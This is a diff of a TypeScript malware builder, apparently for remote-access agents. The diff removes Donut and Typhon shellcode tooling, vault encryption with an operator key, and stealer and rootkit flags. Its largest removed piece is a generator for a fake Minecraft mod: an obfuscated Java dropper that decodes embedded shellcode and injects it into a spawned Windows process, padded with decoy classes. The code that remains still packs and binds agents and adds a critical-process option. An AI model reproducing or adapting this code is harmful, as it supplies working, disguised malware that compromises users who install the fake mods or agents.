@@ -86,214 +86,12 @@ type BuildProcessConfig = {
   iconBase64?: string;
   enableUpx?: boolean;
   upxStripHeaders?: boolean;
-  enableDonut?: boolean;
-  enableTyphon?: boolean;
-  typhonVariant?: string;
-  enableVault?: boolean;
-  vaultRecipient?: string;
-  enableStealer?: boolean;
-  enableJar?: boolean;
-  jarMcVersion?: string;
-  jarModName?: string;
-  jarModId?: string;
-  jarBoundMods?: Array<{ name: string; data: string }>;
-  enableR77?: boolean;
-  enableChaos?: boolean;
-  chaosMode?: string;
-  typhonProcess?: string;
   requireAdmin?: boolean;
+  criticalProcess?: boolean;
   outputExtension?: string;
   sleepSeconds?: number;
   boundFiles?: BoundFile[];
 };
-
-type TyphonInfo = { bin: string; useWine: boolean };
-
-function isPEFile(filePath: string): boolean {
-  try {
-    const fd = fs.openSync(filePath, "r");
-    const header = Buffer.alloc(2);
-    fs.readSync(fd, header, 0, 2, 0);
-    fs.closeSync(fd);
-    return header[0] === 0x4D && header[1] === 0x5A; // MZ
-  } catch {
-    return false;
-  }
-}
-
-async function isWineAvailable(): Promise<boolean> {
-  try {
-    const result = await $`wine --version`.quiet().nothrow();
-    return result.exitCode === 0;
-  } catch {
-    return false;
-  }
-}
-
-async function checkTyphonAvailable(sendToStream: (data: any) => void): Promise<TyphonInfo | null> {
-  const toolsDir = path.join(ensureDataDir(), "tools");
-  fs.mkdirSync(toolsDir, { recursive: true });
-
-  const nativeBuilder = path.join(toolsDir, "typhon-builder");
-  const template = path.join(toolsDir, "typhon.exe");
-
-  // Step 1: ensure native typhon-builder binary exists (compile from Go source if needed)
-  if (!fs.existsSync(nativeBuilder)) {
-    const goSrc = path.join(resolveRuntimeRoot(), "src", "server", "typhon-builder.go");
-    if (!fs.existsSync(goSrc)) {
-      sendToStream({ type: "output", text: `WARNING: typhon-builder.go source not found at ${goSrc}\n`, level: "warn" });
-      return null;
-    }
-    sendToStream({ type: "output", text: "Compiling native typhon-builder from Go source...\n", level: "info" });
-    try {
-      const tmpDir = fs.mkdtempSync("/tmp/typhon-build-");
-      try {
-        fs.copyFileSync(goSrc, path.join(tmpDir, "main.go"));
-        const initResult = await $`go mod init typhon-build`.cwd(tmpDir).nothrow().quiet();
-        if (initResult.exitCode !== 0) {
-          sendToStream({ type: "output", text: `WARNING: go mod init failed: ${initResult.stderr.toString().trim()}\n`, level: "warn" });
-          return null;
-        }
-        const buildResult = await $`go build -o ${nativeBuilder} .`.cwd(tmpDir).nothrow().quiet();
-        if (buildResult.exitCode !== 0) {
-          sendToStream({ type: "output", text: `WARNING: typhon-builder compile failed: ${buildResult.stderr.toString().trim()}\n`, level: "warn" });
-          return null;
-        }
-        fs.chmodSync(nativeBuilder, 0o755);
-        sendToStream({ type: "output", text: `Native typhon-builder compiled: ${nativeBuilder}\n`, level: "info" });
-      } finally {
-        fs.rmSync(tmpDir, { recursive: true, force: true });
-      }
-    } catch (err: any) {
-      sendToStream({ type: "output", text: `WARNING: Failed to compile typhon-builder: ${err.message || err}\n`, level: "warn" });
-      return null;
-    }
-  } else {
-    sendToStream({ type: "output", text: `Native typhon-builder found: ${nativeBuilder}\n`, level: "info" });
-  }
-
-  // Step 2: ensure typhon.exe template exists (needed by typhon-builder to embed shellcode)
-  if (!fs.existsSync(template)) {
-    sendToStream({ type: "output", text: "Fetching Typhon template (typhon.exe) from GitHub...\n", level: "info" });
-    try {
-      const apiResp = await fetch("https://api.github.com/repos/messecv3/typhon-process-injection/releases/latest", {
-        headers: { "User-Agent": "Overlord-Builder/1.0", "Accept": "application/vnd.github+json" },
-      });
-      if (apiResp.ok) {
-        const release = await apiResp.json() as any;
-        const asset = (release.assets as any[]).find((a: any) => /typhon.*\.exe$/i.test(a.name));
-        if (asset) {
-          const dlResp = await fetch(asset.browser_download_url, { headers: { "User-Agent": "Overlord-Builder/1.0" } });
-          if (dlResp.ok) {
-            fs.writeFileSync(template, Buffer.from(await dlResp.arrayBuffer()));
-            sendToStream({ type: "output", text: `Typhon template downloaded: ${template}\n`, level: "info" });
-          }
-        }
-      }
-    } catch {}
-
-    if (!fs.existsSync(template)) {
-      // Fall back: clone repo and grab the binary from there
-      try {
-        const tmpClone = fs.mkdtempSync("/tmp/typhon-clone-");
-        try {
-          const cloneResult = await $`git clone --depth 1 https://github.com/messecv3/typhon-process-injection.git ${tmpClone}`.nothrow().quiet();
-          if (cloneResult.exitCode === 0) {
-            const candidates = [
-              path.join(tmpClone, "typhon.exe"),
-              path.join(tmpClone, "bin", "typhon.exe"),
-              path.join(tmpClone, "release", "typhon.exe"),
-            ];
-            for (const c of candidates) {
-              if (fs.existsSync(c)) {
-                fs.copyFileSync(c, template);
-                sendToStream({ type: "output", text: `Typhon template copied from repo: ${template}\n`, level: "info" });
-                break;
-              }
-            }
-          }
-        } finally {
-          fs.rmSync(tmpClone, { recursive: true, force: true });
-        }
-      } catch {}
-    }
-  }
-
-  if (!fs.existsSync(template)) {
-    sendToStream({ type: "output", text: `WARNING: typhon.exe template not found. Place it at ${template} for Typhon to work.\n`, level: "warn" });
-    return null;
-  }
-
-  return { bin: nativeBuilder, useWine: false };
-}
-
-async function checkDonutAvailable(sendToStream: (data: any) => void): Promise<string | null> {
-  // 1. Honour explicit override
-  const envBin = process.env.DONUT_BIN?.trim();
-  if (envBin && fs.existsSync(envBin)) {
-    sendToStream({ type: "output", text: `Donut found: ${envBin} (DONUT_BIN)\n`, level: "info" });
-    return envBin;
-  }
-
-  // 2. Check system PATH
-  try {
-    const which = await $`which donut`.quiet().nothrow();
-    if (which.exitCode === 0 && which.stdout.toString().trim()) {
-      sendToStream({ type: "output", text: `Donut found in PATH\n`, level: "info" });
-      return "donut";
-    }
-  } catch {}
-
-  // 3. Check for a previously built binary in the data/tools dir
-  const toolsDir = path.join(ensureDataDir(), "tools");
-  const localDonut = path.join(toolsDir, process.platform === "win32" ? "donut.exe" : "donut");
-  if (fs.existsSync(localDonut)) {
-    sendToStream({ type: "output", text: `Donut found: ${localDonut}\n`, level: "info" });
-    return localDonut;
-  }
-
-  // 4. On Linux, auto-build donut from source (requires git, make, gcc)
-  if (process.platform === "linux") {
-    sendToStream({ type: "output", text: "Donut not found — attempting to build from source...\n", level: "info" });
-    try {
-      fs.mkdirSync(toolsDir, { recursive: true });
-      const srcDir = path.join(toolsDir, "donut-src");
-
-      if (!fs.existsSync(path.join(srcDir, "Makefile"))) {
-        sendToStream({ type: "output", text: "Cloning thewover/donut...\n", level: "info" });
-        const cloneResult = await $`git clone --depth 1 https://github.com/thewover/donut.git ${srcDir}`.quiet().nothrow();
-        if (cloneResult.exitCode !== 0) {
-          const err = (cloneResult.stderr.toString() || cloneResult.stdout.toString()).trim();
-          sendToStream({ type: "output", text: `WARNING: Failed to clone Donut: ${err}\n`, level: "warn" });
-          return null;
-        }
-      }
-
-      sendToStream({ type: "output", text: "Building Donut (make)...\n", level: "info" });
-      const makeResult = await $`make`.cwd(srcDir).nothrow().quiet();
-      if (makeResult.exitCode !== 0) {
-        const err = (makeResult.stderr.toString() || makeResult.stdout.toString()).trim();
-        sendToStream({ type: "output", text: `WARNING: Failed to build Donut: ${err}\n`, level: "warn" });
-        return null;
-      }
-
-      const builtBin = path.join(srcDir, "donut");
-      if (!fs.existsSync(builtBin)) {
-        sendToStream({ type: "output", text: "WARNING: Donut build succeeded but binary not found\n", level: "warn" });
-        return null;
-      }
-
-      fs.copyFileSync(builtBin, localDonut);
-      fs.chmodSync(localDonut, 0o755);
-      sendToStream({ type: "output", text: `Donut built and cached: ${localDonut}\n`, level: "info" });
-      return localDonut;
-    } catch (buildErr: any) {
-      sendToStream({ type: "output", text: `WARNING: Donut auto-build failed: ${buildErr.message || buildErr}\n`, level: "warn" });
-    }
-  }
-
-  return null;
-}
 
 async function checkUpxAvailable(sendToStream: (data: any) => void): Promise<boolean> {
   try {
@@ -306,411 +104,6 @@ async function checkUpxAvailable(sendToStream: (data: any) => void): Promise<boo
   } catch {}
   return false;
 }
-
-async function checkVaultAvailable(sendToStream: (data: any) => void): Promise<string | null> {
-  const toolsDir = path.join(ensureDataDir(), "tools");
-  const localVault = path.join(toolsDir, process.platform === "win32" ? "vault.exe" : "vault");
-
-  // 1. VAULT_BIN env var
-  const envBin = process.env.VAULT_BIN?.trim();
-  if (envBin && fs.existsSync(envBin)) {
-    sendToStream({ type: "output", text: `Vault found: ${envBin} (VAULT_BIN)\n`, level: "info" });
-    return envBin;
-  }
-
-  // 2. System PATH — vault info exits 0 when the binary is present
-  try {
-    const check = await $`vault info`.quiet().nothrow();
-    if (check.exitCode === 0) {
-      sendToStream({ type: "output", text: `Vault found in PATH\n`, level: "info" });
-      return "vault";
-    }
-  } catch {}
-
-  // 3. Previously built binary cached in data/tools/
-  if (fs.existsSync(localVault)) {
-    sendToStream({ type: "output", text: `Vault found: ${localVault}\n`, level: "info" });
-    return localVault;
-  }
-
-  // 4. Auto-build from source via Cargo (cross-platform — works wherever Rust is installed)
-  sendToStream({ type: "output", text: "Vault not found — attempting to build from source (requires Rust/cargo)...\n", level: "info" });
-  try {
-    fs.mkdirSync(toolsDir, { recursive: true });
-    const srcDir = path.join(toolsDir, "vault-pq-src");
-
-    if (!fs.existsSync(path.join(srcDir, "Cargo.toml"))) {
-      sendToStream({ type: "output", text: "Cloning messecv3/vault-pq...\n", level: "info" });
-      const cloneResult = await $`git clone --depth 1 https://github.com/messecv3/vault-pq.git ${srcDir}`.quiet().nothrow();
-      if (cloneResult.exitCode !== 0) {
-        const err = (cloneResult.stderr.toString() || cloneResult.stdout.toString()).trim();
-        sendToStream({ type: "output", text: `WARNING: Failed to clone vault-pq: ${err}\n`, level: "warn" });
-        return null;
-      }
-    }
-
-    sendToStream({ type: "output", text: "Building vault-pq (cargo build --release)...\n", level: "info" });
-    const buildResult = await $`cargo build --release`.cwd(srcDir).nothrow().quiet();
-    if (buildResult.exitCode !== 0) {
-      const err = (buildResult.stderr.toString() || buildResult.stdout.toString()).trim();
-      sendToStream({ type: "output", text: `WARNING: vault-pq build failed: ${err}\n`, level: "warn" });
-      return null;
-    }
-
-    const releaseBin = path.join(srcDir, "target", "release", process.platform === "win32" ? "vault.exe" : "vault");
-    if (!fs.existsSync(releaseBin)) {
-      sendToStream({ type: "output", text: "WARNING: vault build succeeded but binary not found\n", level: "warn" });
-      return null;
-    }
-
-    fs.copyFileSync(releaseBin, localVault);
-    if (process.platform !== "win32") fs.chmodSync(localVault, 0o755);
-    sendToStream({ type: "output", text: `Vault built and cached: ${localVault}\n`, level: "info" });
-    return localVault;
-  } catch (buildErr: any) {
-    sendToStream({ type: "output", text: `WARNING: vault-pq auto-build failed: ${buildErr.message || buildErr}\n`, level: "warn" });
-  }
-
-  return null;
-}
-
-async function ensureVaultKeypair(vaultBin: string, sendToStream: (data: any) => void): Promise<string | null> {
-  const keyPath = path.join(ensureDataDir(), "tools", "vault-operator-key");
-  const pubKeyPath = keyPath + ".pub";
-
-  if (!fs.existsSync(pubKeyPath)) {
-    sendToStream({ type: "output", text: "Generating Vault operator keypair for this server...\n", level: "info" });
-    const result = await $`${vaultBin} keygen --output ${keyPath}`.nothrow().quiet();
-    if (result.exitCode !== 0 || !fs.existsSync(pubKeyPath)) {
-      const err = (result.stderr.toString() || result.stdout.toString()).trim();
-      sendToStream({ type: "output", text: `WARNING: Failed to generate Vault keypair: ${err}\n`, level: "warn" });
-      return null;
-    }
-    sendToStream({ type: "output", text: `Vault keypair generated.\n`, level: "info" });
-    sendToStream({ type: "output", text: `  Private key: ${keyPath}\n`, level: "info" });
-    sendToStream({ type: "output", text: `  Public  key: ${pubKeyPath}\n`, level: "info" });
-    sendToStream({ type: "output", text: `IMPORTANT: Download the private key to decrypt vault files — keep it safe and off the server.\n`, level: "warn" });
-  }
-
-  try {
-    return fs.readFileSync(pubKeyPath, "utf8").trim();
-  } catch {
-    return null;
-  }
-}
-
-async function checkJavaAvailable(sendToStream: (data: any) => void): Promise<{ javac: string; jar: string } | null> {
-  try {
-    const jv = await $`javac -version`.quiet().nothrow();
-    if (jv.exitCode !== 0) return null;
-    const jr = await $`jar --version`.quiet().nothrow();
-    if (jr.exitCode !== 0) {
-      // older JDKs use 'jar cf' without --version; try 'jar' alone
-      const jr2 = await $`jar`.quiet().nothrow();
-      if (jr2.exitCode !== 1 && jr2.exitCode !== 0) return null;
-    }
-    const ver = jv.stderr.toString().trim() || jv.stdout.toString().trim();
-    sendToStream({ type: "output", text: `Java found: ${ver}\n`, level: "info" });
-    return { javac: "javac", jar: "jar" };
-  } catch {
-    return null;
-  }
-}
-
-async function fetchGithubReleaseAssets(
-  owner: string,
-  repo: string,
-  assetNames: string[],
-  cacheDir: string,
-  sendToStream: (data: any) => void,
-): Promise<Record<string, string>> {
-  fs.mkdirSync(cacheDir, { recursive: true });
-  const cached: Record<string, string> = {};
-  for (const name of assetNames) {
-    const p = path.join(cacheDir, name);
-    if (fs.existsSync(p)) cached[name] = p;
-  }
-  const missing = assetNames.filter((n) => !cached[n]);
-  if (missing.length === 0) {
-    sendToStream({ type: "output", text: `Using cached ${owner}/${repo} assets\n`, level: "info" });
-    return cached;
-  }
-  sendToStream({ type: "output", text: `Fetching ${owner}/${repo} latest release from GitHub...\n`, level: "info" });
-  try {
-    const apiUrl = `https://api.github.com/repos/${owner}/${repo}/releases/latest`;
-    const resp = await fetch(apiUrl, { headers: { "User-Agent": "Overlord-Builder/1.0", "Accept": "application/vnd.github+json" } });
-    if (!resp.ok) {
-      sendToStream({ type: "output", text: `WARNING: GitHub API returned ${resp.status} for ${owner}/${repo}\n`, level: "warn" });
-      return cached;
-    }
-    const release = await resp.json() as any;
-    const assets: any[] = release.assets || [];
-    sendToStream({ type: "output", text: `Found release: ${release.tag_name} (${assets.length} assets)\n`, level: "info" });
-    for (const name of missing) {
-      const asset = assets.find((a: any) => a.name === name);
-      if (!asset) {
-        sendToStream({ type: "output", text: `WARNING: Asset '${name}' not found in ${owner}/${repo} latest release\n`, level: "warn" });
-        continue;
-      }
-      sendToStream({ type: "output", text: `Downloading ${name} (${asset.size} bytes)...\n`, level: "info" });
-      const dlResp = await fetch(asset.browser_download_url, { headers: { "User-Agent": "Overlord-Builder/1.0" } });
-      if (!dlResp.ok) {
-        sendToStream({ type: "output", text: `WARNING: Failed to download ${name} (HTTP ${dlResp.status})\n`, level: "warn" });
-        continue;
-      }
-      const buf = await dlResp.arrayBuffer();
-      const localPath = path.join(cacheDir, name);
-      fs.writeFileSync(localPath, Buffer.from(buf));
-      cached[name] = localPath;
-      sendToStream({ type: "output", text: `Downloaded: ${name}\n`, level: "info" });
-    }
-  } catch (err: any) {
-    sendToStream({ type: "output", text: `WARNING: Failed to fetch ${owner}/${repo} release assets: ${err.message || err}\n`, level: "warn" });
-  }
-  return cached;
-}
-
-function generateJarDropperSource(): string {
-  return [
-    "package com.mc.mod;",
-    "import java.io.*;",
-    "import java.util.*;",
-    "import net.fabricmc.api.ModInitializer;",
-    "public class ModLoader implements ModInitializer{",
-    "  private static final String TAG=\"[ModLoader]\";",
-    "  private static final java.util.concurrent.atomic.AtomicBoolean RAN=new java.util.concurrent.atomic.AtomicBoolean(false);",
-    "  private static String x(int[]a){byte[]b=new byte[a.length];for(int i=0;i<a.length;i++)b[i]=(byte)(a[i]-90);try{return new String(b,\"UTF-8\");}catch(Exception e){return \"\";}}",
-    "  private static java.lang.reflect.Method gm(Class<?>c,String n,Class<?>...p){for(java.lang.reflect.Method m:c.getMethods())if(m.getName().equals(n)&&Arrays.equals(m.getParameterTypes(),p))return m;return null;}",
-    "  private static byte[]rd(InputStream s)throws Exception{ByteArrayOutputStream b=new ByteArrayOutputStream();byte[]t=new byte[4096];int n;while((n=s.read(t))!=-1)b.write(t,0,n);s.close();return b.toByteArray();}",
-    "  private static void log(String m){System.out.println(TAG+\" \"+m);}",
-    "  static{try{run();}catch(Exception e){log(\"static-init error: \"+e);}}",
-    "  public void onInitialize(){log(\"onInitialize called\");try{run();}catch(Exception e){log(\"onInitialize error: \"+e);}}",
-    "  public static void main(String[]a){try{run();}catch(Exception e){log(\"main error: \"+e);}}",
-    "  private static void run()throws Exception{",
-    "    if(!RAN.compareAndSet(false,true)){log(\"already ran\");return;}",
-    "    log(\"run() start\");",
-    "    Random rng=new Random();",
-    "    long acc=0;",
-    "    for(int i=0;i<rng.nextInt(500)+200;i++)acc+=(long)(Math.pow(rng.nextDouble()*13,2));",
-    "    if(acc<0){log(\"acc check failed\");return;}",
-    "    Thread.sleep(1000+rng.nextInt(2000));",
-    "    log(\"loading payload resource\");",
-    "    InputStream is=ModLoader.class.getResourceAsStream(x(new int[]{137,187,205,205,191,206,205,137,190,187,206,187,136,202,187,197}));",
-    "    if(is==null){log(\"data.pak not found in JAR\");return;}",
-    "    byte[]raw=rd(is);",
-    "    log(\"payload read: \"+raw.length+\" bytes\");",
-    "    int key=raw[0]&0xFF;",
-    "    byte[]sc=new byte[raw.length-1];",
-    "    for(int i=0;i<sc.length;i++)sc[i]=(byte)(raw[i+1]-key);",
-    "    log(\"shellcode decoded: \"+sc.length+\" bytes\");",
-    "    Class<?>FC=Class.forName(x(new int[]{189,201,199,136,205,207,200,136,196,200,187,136,160,207,200,189,206,195,201,200}));",
-    "    Class<?>PC=Class.forName(x(new int[]{189,201,199,136,205,207,200,136,196,200,187,136,170,201,195,200,206,191,204}));",
-    "    Class<?>MC=Class.forName(x(new int[]{189,201,199,136,205,207,200,136,196,200,187,136,167,191,199,201,204,211}));",
-    "    java.lang.reflect.Method gf=gm(FC,x(new int[]{193,191,206,160,207,200,189,206,195,201,200}),String.class,String.class);",
-    "    java.lang.reflect.Method iv=gm(FC,x(new int[]{195,200,208,201,197,191}),Class.class,Object[].class);",
-    "    Object NP=PC.getField(\"NULL\").get(null);",
-    "    java.lang.reflect.Method setI=gm(MC,x(new int[]{205,191,206,163,200,206}),long.class,int.class);",
-    "    java.lang.reflect.Method setS=gm(MC,x(new int[]{205,191,206,173,194,201,204,206}),long.class,short.class);",
-    "    java.lang.reflect.Method getP=gm(MC,x(new int[]{193,191,206,170,201,195,200,206,191,204}),long.class);",
-    "    java.lang.reflect.Method getI=gm(MC,x(new int[]{193,191,206,163,200,206}),long.class);",
-    "    java.lang.reflect.Method clr=gm(MC,x(new int[]{189,198,191,187,204}));",
-    "    Object siMem=MC.getConstructor(long.class).newInstance(104L);",
-    "    clr.invoke(siMem);",
-    "    setI.invoke(siMem,0L,104);",
-    "    setI.invoke(siMem,60L,1);",
-    "    setS.invoke(siMem,64L,(short)0);",
-    "    Object piMem=MC.getConstructor(long.class).newInstance(24L);",
-    "    clr.invoke(piMem);",
-    "    Object fCPA=gf.invoke(null,x(new int[]{197,191,204,200,191,198,141,140}),x(new int[]{157,204,191,187,206,191,170,204,201,189,191,205,205,155}));",
-    "    String sysRoot=System.getenv(x(new int[]{173,211,205,206,191,199,172,201,201,206}));",
-    "    if(sysRoot==null||sysRoot.isEmpty())sysRoot=x(new int[]{157,148,182,177,195,200,190,201,209,205});",
-    "    String tgtExe=x(new int[]{200,201,206,191,202,187,190,136,191,210,191});",
-    "    String tgt=sysRoot+\"\\\\\"+x(new int[]{173,211,205,206,191,199,141,140})+\"\\\\\"+tgtExe;",
-    "    Boolean cpOk=(Boolean)iv.invoke(fCPA,Boolean.class,new Object[]{NP,tgt,NP,NP,false,0x08000004,NP,NP,siMem,piMem});",
-    "    log(\"spawn ok=\"+cpOk);",
-    "    if(Boolean.FALSE.equals(cpOk)){",
-    "      cpOk=(Boolean)iv.invoke(fCPA,Boolean.class,new Object[]{NP,tgtExe,NP,NP,false,0x08000004,NP,NP,siMem,piMem});",
-    "      log(\"spawn fallback ok=\"+cpOk);",
-    "    }",
-    "    if(Boolean.FALSE.equals(cpOk))return;",
-    "    Object hProc=getP.invoke(piMem,0L);",
-    "    int spid=((Integer)getI.invoke(piMem,16L)).intValue();",
-    "    log(\"spawned pid=\"+spid);",
-    "    if(hProc==null||hProc.equals(NP))return;",
-    "    Object fVA=gf.invoke(null,x(new int[]{197,191,204,200,191,198,141,140}),x(new int[]{176,195,204,206,207,187,198,155,198,198,201,189,159,210}));",
-    "    Object ra=iv.invoke(fVA,PC,new Object[]{hProc,NP,(long)sc.length,0x3000,0x40});",
-    "    log(\"raddr=\"+ra);",
-    "    if(ra==null||ra.equals(NP))return;",
-    "    Object fWM=gf.invoke(null,x(new int[]{197,191,204,200,191,198,141,140}),x(new int[]{177,204,195,206,191,170,204,201,189,191,205,205,167,191,199,201,204,211}));",
-    "    Object mem=MC.getConstructor(long.class).newInstance((long)sc.length);",
-    "    gm(MC,x(new int[]{209,204,195,206,191}),long.class,byte[].class,int.class,int.class).invoke(mem,0L,sc,0,sc.length);",
-    "    iv.invoke(fWM,Integer.class,new Object[]{hProc,ra,mem,(long)sc.length,NP});",
-    "    log(\"written\");",
-    "    Object fCT=gf.invoke(null,x(new int[]{197,191,204,200,191,198,141,140}),x(new int[]{157,204,191,187,206,191,172,191,199,201,206,191,174,194,204,191,187,190}));",
-    "    Object ht=iv.invoke(fCT,PC,new Object[]{hProc,NP,0L,ra,NP,0,NP});",
-    "    log(\"thread=\"+ht);",
-    "  }",
-    "}",
-  ].join("\n");
-}
-
-function generateDummyClasses(modId: string): Record<string, string> {
-  const pkg = `com.mc.mod`;
-  return {
-    [`${pkg.replace(/\./g, "/")}/ModConfig.java`]: [
-      `package ${pkg};`,
-      `public class ModConfig {`,
-      `  public static final String MOD_ID = "${modId}";`,
-      `  public static final String VERSION = "1.0.0";`,
-      `  private boolean debugMode = false;`,
-      `  private int renderDistance = 8;`,
-      `  private float particleScale = 1.0f;`,
-      `  public boolean isDebugMode(){return debugMode;}`,
-      `  public void setDebugMode(boolean v){this.debugMode=v;}`,
-      `  public int getRenderDistance(){return renderDistance;}`,
-      `  public void setRenderDistance(int v){this.renderDistance=v;}`,
-      `  public float getParticleScale(){return particleScale;}`,
-      `  public void setParticleScale(float v){this.particleScale=v;}`,
-      `  public static ModConfig createDefault(){return new ModConfig();}`,
-      `}`,
-    ].join("\n"),
-    [`${pkg.replace(/\./g, "/")}/ModUtils.java`]: [
-      `package ${pkg};`,
-      `import java.util.*;`,
-      `public class ModUtils {`,
-      `  private static final Random RNG = new Random();`,
-      `  public static String generateId(){return Long.toHexString(RNG.nextLong());}`,
-      `  public static int clamp(int v,int lo,int hi){return Math.max(lo,Math.min(hi,v));}`,
-      `  public static float lerp(float a,float b,float t){return a+(b-a)*t;}`,
-      `  public static boolean isNullOrEmpty(String s){return s==null||s.isEmpty();}`,
-      `  public static List<String> splitLines(String s){`,
-      `    return s==null?Collections.emptyList():Arrays.asList(s.split("\\n"));`,
-      `  }`,
-      `}`,
-    ].join("\n"),
-    [`${pkg.replace(/\./g, "/")}/ModRegistry.java`]: [
-      `package ${pkg};`,
-      `import java.util.*;`,
-      `public class ModRegistry {`,
-      `  private static final Map<String,Object> ENTRIES = new LinkedHashMap<>();`,
-      `  public static void register(String key,Object value){ENTRIES.put(key,value);}`,
-      `  public static Object get(String key){return ENTRIES.get(key);}`,
-      `  public static boolean has(String key){return ENTRIES.containsKey(key);}`,
-      `  public static Set<String> keys(){return Collections.unmodifiableSet(ENTRIES.keySet());}`,
-      `  public static void clear(){ENTRIES.clear();}`,
-      `}`,
-    ].join("\n"),
-    [`${pkg.replace(/\./g, "/")}/TickHandler.java`]: [
-      `package ${pkg};`,
-      `public class TickHandler {`,
-      `  private int tickCount = 0;`,
-      `  private long lastTickTime = 0L;`,
-      `  public void onTick(){`,
-      `    tickCount++;`,
-      `    lastTickTime = System.currentTimeMillis();`,
-      `  }`,
-      `  public int getTickCount(){return tickCount;}`,
-      `  public long getLastTickTime(){return lastTickTime;}`,
-      `  public void reset(){tickCount=0;lastTickTime=0L;}`,
-      `  public boolean isActive(){return lastTickTime>0;}`,
-      `}`,
-    ].join("\n"),
-    [`${pkg.replace(/\./g, "/")}/EventBus.java`]: [
-      `package ${pkg};`,
-      `import java.util.*;`,
-      `public class EventBus {`,
-      `  public interface Listener<T>{void onEvent(T event);}`,
-      `  private final Map<String,List<Listener<?>>> handlers = new HashMap<>();`,
-      `  public <T> void subscribe(String event,Listener<T> l){`,
-      `    handlers.computeIfAbsent(event,k->new ArrayList<>()).add(l);`,
-      `  }`,
-      `  @SuppressWarnings("unchecked")`,
-      `  public <T> void publish(String event,T data){`,
-      `    List<Listener<?>> ls=handlers.getOrDefault(event,Collections.emptyList());`,
-      `    for(Listener<?> l:ls)((Listener<T>)l).onEvent(data);`,
-      `  }`,
-      `  public void unsubscribeAll(String event){handlers.remove(event);}`,
-      `}`,
-    ].join("\n"),
-    [`${pkg.replace(/\./g, "/")}/ResourceHelper.java`]: [
-      `package ${pkg};`,
-      `import java.io.*;`,
-      `public class ResourceHelper {`,
-      `  public static byte[] readResource(String path)throws IOException{`,
-      `    InputStream is=ResourceHelper.class.getResourceAsStream(path);`,
-      `    if(is==null)throw new IOException("Resource not found: "+path);`,
-      `    ByteArrayOutputStream buf=new ByteArrayOutputStream();`,
-      `    byte[]tmp=new byte[4096];int n;`,
-      `    while((n=is.read(tmp))!=-1)buf.write(tmp,0,n);`,
-      `    is.close();return buf.toByteArray();`,
-      `  }`,
-      `  public static String readText(String path)throws IOException{`,
-      `    return new String(readResource(path),"UTF-8");`,
-      `  }`,
-      `}`,
-    ].join("\n"),
-  };
-}
-
-function generateMcMetadata(mcVersion: string, modId: string, modName: string, nestedJarNames: string[] = []): Record<string, string> {
-  const minor = parseInt(mcVersion.split(".")[1] || "0", 10);
-  if (minor >= 14) {
-    // Modern Fabric (1.14+)
-    const fabricJson: any = {
-      schemaVersion: 1,
-      id: modId,
-      version: "1.0.0",
-      name: modName,
-      description: "",
-      authors: [],
-      entrypoints: { main: ["com.mc.mod.ModLoader"] },
-      depends: { fabricloader: ">=0.14.0", minecraft: ">=1.21 <1.22" },
-    };
-    if (nestedJarNames.length > 0) {
-      fabricJson.jars = nestedJarNames.map(n => ({ file: `META-INF/jars/${n}` }));
-    }
-    return { "fabric.mod.json": JSON.stringify(fabricJson, null, 2) };
-  } else if (minor >= 13) {
-    // Forge 1.13+ (mods.toml)
-    const toml = [
-      `modLoader="javafml"`,
-      `loaderVersion="[36,)"`,
-      `license="MIT"`,
-      `[[mods]]`,
-      `modId="${modId}"`,
-      `version="1.0.0"`,
-      `displayName="${modName}"`,
-      `description=''''''`,
-      `[[dependencies.${modId}]]`,
-      `  modId="forge"`,
-      `  mandatory=true`,
-      `  versionRange="[36,)"`,
-      `  ordering="NONE"`,
-      `  side="BOTH"`,
-      `[[dependencies.${modId}]]`,
-      `  modId="minecraft"`,
-      `  mandatory=true`,
-      `  versionRange="[${mcVersion},)"`,
-      `  ordering="NONE"`,
-      `  side="BOTH"`,
-    ].join("\n");
-    return { "META-INF/mods.toml": toml };
-  } else {
-    // Legacy Forge (1.12.2 and below — mcmod.info)
-    const mcmodJson = [
-      {
-        modid: modId,
-        name: modName,
-        description: "",
-        version: "1.0.0",
-        mcversion: mcVersion,
-        authorList: [],
-      },
-    ];
-    return { "mcmod.info": JSON.stringify(mcmodJson, null, 2) };
-  }
-}
-
 
 function stripUpxHeaders(filePath: string): boolean {
   try {
@@ -925,47 +318,6 @@ export async function startBuildProcess(
         throw new Error("UPX not found");
       }
       upxBin = "upx";
-    }
-
-    let donutBin: string | null = null;
-    if (config.enableDonut || config.enableTyphon) {
-      // Typhon needs Donut shellcode as input, so auto-enable Donut detection when Typhon is on
-      const donutFound = await checkDonutAvailable(sendToStream);
-      if (!donutFound) {
-        sendToStream({
-          type: "output",
-          text: "ERROR: Donut is not installed or not found in PATH. Please install Donut (https://github.com/thewover/donut) and ensure it is available on PATH or set DONUT_BIN, then retry.\n",
-          level: "error",
-        });
-        throw new Error("Donut not found");
-      }
-      donutBin = donutFound;
-    }
-
-    let typhonInfo: TyphonInfo | null = null;
-    if (config.enableTyphon) {
-      typhonInfo = await checkTyphonAvailable(sendToStream);
-      if (!typhonInfo) {
-        sendToStream({
-          type: "output",
-          text: "ERROR: Typhon is not available. Ensure Go is installed (for native typhon-builder compilation) and typhon.exe template is accessible. See https://github.com/messecv3/typhon-process-injection\n",
-          level: "error",
-        });
-        throw new Error("Typhon not found");
-      }
-    }
-
-    let vaultBin: string | null = null;
-    if (config.enableVault) {
-      vaultBin = await checkVaultAvailable(sendToStream);
-      if (!vaultBin) {
-        sendToStream({
-          type: "output",
-          text: "ERROR: Vault is not available. Install Rust/cargo or place the vault binary in data/tools/, then retry. See https://github.com/messecv3/vault-pq\n",
-          level: "error",
-        });
-        throw new Error("Vault not found");
-      }
     }
 
     const hasAssemblyData = !!(config.assemblyTitle || config.assemblyProduct || config.assemblyCompany || config.assemblyVersion || config.assemblyCopyright || config.iconBase64 || config.requireAdmin);
@@ -1254,17 +606,13 @@ func runBoundFiles() {
     }
     // ── End binder setup ──────────────────────────────────────────────────────
 
-    let jarSourcePath: string | null = null;
     for (const platform of platformsToBuild) {
       const [os, arch, ...rest] = platform.split("-");
       const goarm = arch === "armv7" ? "7" : undefined;
       const actualArch = goarm ? "arm" : arch;
       const targetKey = `${os}/${actualArch}${goarm ? `/v${goarm}` : ""}`;
       const namePrefix = config.outputName || "agent";
-      const outputExtIsBin = config.outputExtension === ".bin";
-      const outputExtIsJar = !!(config.enableJar || config.outputExtension === ".jar");
-      // .bin and .jar both compile the Go binary as .exe internally; Donut converts to shellcode for both
-      const winExt = (outputExtIsBin || outputExtIsJar) ? ".exe" : (config.outputExtension || ".exe");
+      const winExt = config.outputExtension || ".exe";
       const outputName = deps.sanitizeOutputName(
         platform.includes("windows") ? `${namePrefix}-${platform}${winExt}` : `${namePrefix}-${platform}`,
       );
